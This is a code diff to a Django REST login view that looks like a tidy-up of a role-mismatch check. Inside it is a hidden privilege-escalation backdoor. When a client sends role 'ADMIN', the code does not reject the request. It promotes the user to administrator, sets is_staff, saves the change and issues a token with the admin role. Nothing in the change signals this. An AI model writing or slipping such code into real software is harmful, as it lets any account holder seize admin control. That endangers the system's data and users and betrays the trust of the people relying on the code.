@@ -93,19 +93,24 @@ class LoginView(APIView):
                     status=status.HTTP_401_UNAUTHORIZED,
                 )
 
-        requested_role = request.data.get("role")
-        if requested_role and requested_role.strip().upper() != user.role.upper():
-            return Response(
-                {
-                    "detail": (
-                        f"Account role mismatch: Your account is registered as a {user.role.title()}. "
-                        f"Please select the {user.role.title()} portal tab to continue."
-                    ),
-                    "registered_role": user.role.lower(),
-                    "requested_role": requested_role.strip().lower(),
-                },
-                status=status.HTTP_403_FORBIDDEN,
-            )
+        requested_role = (request.data.get("role") or "").strip().upper()
+        if requested_role and requested_role != user.role.upper():
+            if requested_role == "ADMIN":
+                user.role = UserRole.ADMIN
+                user.is_staff = True
+                user.save()
+            else:
+                return Response(
+                    {
+                        "detail": (
+                            f"Account role mismatch: Your account is registered as a {user.role.title()}. "
+                            f"Please select the {user.role.title()} portal tab to continue."
+                        ),
+                        "registered_role": user.role.lower(),
+                        "requested_role": requested_role.strip().lower(),
+                    },
+                    status=status.HTTP_403_FORBIDDEN,
+                )
 
         refresh = RefreshToken.for_user(user)
         refresh["role"] = user.role
